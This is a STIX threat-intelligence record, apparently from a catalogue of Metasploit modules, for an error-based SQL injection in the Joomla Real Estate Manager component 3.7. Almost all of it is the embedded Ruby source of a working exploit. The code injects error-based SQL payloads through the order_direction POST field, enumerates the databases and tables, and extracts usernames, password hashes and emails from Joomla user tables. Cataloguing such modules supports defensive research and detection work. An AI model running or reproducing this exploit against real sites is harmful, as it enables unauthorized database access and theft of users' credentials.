{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49675b57-6265-447a-b5d7-844d6479da34",
    "created": "2024-08-14T16:32:17.844345Z",
    "modified": "2024-08-14T16:32:17.844348Z",
    "name": "Joomla Real Estate Manager Component Error-Based SQL Injection",
    "description": " This module exploits a SQL injection vulnerability in Joomla Plugin com_realestatemanager versions 3.7 in order to either enumerate usernames and password hashes.  'References'     => [ ['EDB', '38445'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/joomla_com_realestatemanager_sqli.rb",
            "external_id": "joomla_com_realestatemanager_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Joomla Real Estate Manager Component Error-Based SQL Injection',\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability in Joomla Plugin\n        com_realestatemanager versions 3.7 in order to either enumerate\n        usernames and password hashes.\n      },\n      'References'     =>\n        [\n          ['EDB', '38445']\n        ],\n      'Author'         =>\n        [\n          'Omer Ramic', # discovery\n          'Nixawk', # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2015-10-22'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])\n      ])\n  end\n\n  def print_good(message='')\n    super(\"#{rhost}:#{rport} - #{message}\")\n  end\n\n  def print_status(message='')\n    super(\"#{rhost}:#{rport} - #{message}\")\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: ssl ? 'https' : 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user]\n    }.merge(service_data)\n\n    if opts[:password]\n      credential_data.merge!(\n        private_data: opts[:password],\n        private_type: :nonreplayable_hash,\n        jtr_format: 'md5'\n      )\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: opts[:status],\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def check\n    flag = Rex::Text.rand_text_alpha(5)\n    payload = \"0x#{flag.unpack('H*')[0]}\"\n\n    data = sqli(payload)\n    if data && data.include?(flag)\n      Msf::Exploit::CheckCode::Vulnerable\n    else\n      Msf::Exploit::CheckCode::Safe\n    end\n  end\n\n  def sqli(query)\n    lmark = Rex::Text.rand_text_alpha(5)\n    rmark = Rex::Text.rand_text_alpha(5)\n\n    payload = '(SELECT 6062 FROM(SELECT COUNT(*),CONCAT('\n    payload << \"0x#{lmark.unpack('H*')[0]},\"\n    payload << '%s,'\n    payload << \"0x#{rmark.unpack('H*')[0]},\"\n    payload << 'FLOOR(RAND(0)*2)'\n    payload << ')x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'\n\n    get = {\n      'option' => 'com_realestatemanager',\n      'task' => 'showCategory',\n      'catid' => '50',\n      'Itemid' => '132'\n    }\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get'  => get,\n    })\n\n\n    if res && res.code == 200\n      cookie = res.get_cookies\n      post = {\n        'order_field' => 'price',\n        'order_direction' => 'asc,' + (payload % query)\n      }\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST',\n        'cookie' => cookie,\n        'vars_get'  => get,\n        'vars_post' => post\n      })\n\n      # Error based SQL Injection\n      if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/\n        $1\n      end\n    end\n  end\n\n  def query_databases\n    dbs = []\n\n    query = '(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) '\n    query << 'FROM INFORMATION_SCHEMA.SCHEMATA)'\n\n    dbc = sqli(query)\n\n    query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '\n    query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'\n\n    0.upto(dbc.to_i - 1) do |i|\n      dbname = sqli(query_fmt % i)\n      dbs << dbname\n      vprint_good(\"Found database name: #{dbname}\")\n    end\n\n    %w(performance_schema information_schema mysql).each do |dbname|\n      dbs.delete(dbname) if dbs.include?(dbname)\n    end\n    dbs\n  end\n\n  def query_tables(database)\n    tbs = []\n\n    query = '(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) '\n    query << 'FROM INFORMATION_SCHEMA.TABLES '\n    query << \"WHERE table_schema IN (0x#{database.unpack('H*')[0]}))\"\n\n    tbc = sqli(query)\n\n    query_fmt = '(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) '\n    query_fmt << 'FROM INFORMATION_SCHEMA.TABLES '\n    query_fmt << \"WHERE table_schema IN (0x#{database.unpack('H*')[0]}) \"\n    query_fmt << 'LIMIT %d,1)'\n\n    vprint_status('tables in database: %s' % database)\n    0.upto(tbc.to_i - 1) do |i|\n      tbname = sqli(query_fmt % i)\n      vprint_good(\"Found table #{database}.#{tbname}\")\n      tbs << tbname if tbname =~ /_users$/\n    end\n    tbs\n  end\n\n  def query_columns(database, table)\n    cols = []\n    query = \"(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})\"\n\n    colc = sqli(query)\n    vprint_status(\"Found Columns: #{colc} from #{database}.#{table}\")\n\n    valid_cols = [   # joomla_users\n      'activation',\n      'block',\n      'email',\n      'id',\n      'lastResetTime',\n      'lastvisitDate',\n      'name',\n      'otep',\n      'otpKey',\n      'params',\n      'password',\n      'registerDate',\n      'requireReset',\n      'resetCount',\n      'sendEmail',\n      'username'\n    ]\n\n    query_fmt = '(SELECT MID((IFNULL(CAST(%s AS CHAR),0x20)),%d,54) '\n    query_fmt << \"FROM #{database}.#{table} ORDER BY id LIMIT %d,1)\"\n\n    0.upto(colc.to_i - 1) do |i|\n      record = {}\n      valid_cols.each do |col|\n        l = 1\n        record[col] = ''\n        loop do\n          value = sqli(query_fmt % [col, l, i])\n          break if value.blank?\n          record[col] << value\n          l += 54\n        end\n      end\n      cols << record\n\n      unless record['username'].blank?\n        print_good(\"Found credential: #{record['username']}:#{record['password']} (Email: #{record['email']})\")\n        report_cred(\n          ip: rhost,\n          port: datastore['RPORT'],\n          user: record['username'].to_s,\n          password: record['password'].to_s,\n          status: Metasploit::Model::Login::Status::UNTRIED,\n          proof: record.to_s\n        )\n      end\n\n      vprint_status(record.to_s)\n    end\n    cols\n  end\n\n  def run\n    dbs = query_databases\n    dbs.each do |db|\n      tables = query_tables(db)\n      tables.each do |table|\n        cols = query_columns(db, table)\n        next if cols.blank?\n        path = store_loot(\n          'joomla.users',\n          'text/plain',\n          datastore['RHOST'],\n          cols.to_json,\n          'joomla.users')\n        print_good('Saved file to: ' + path)\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-22"
}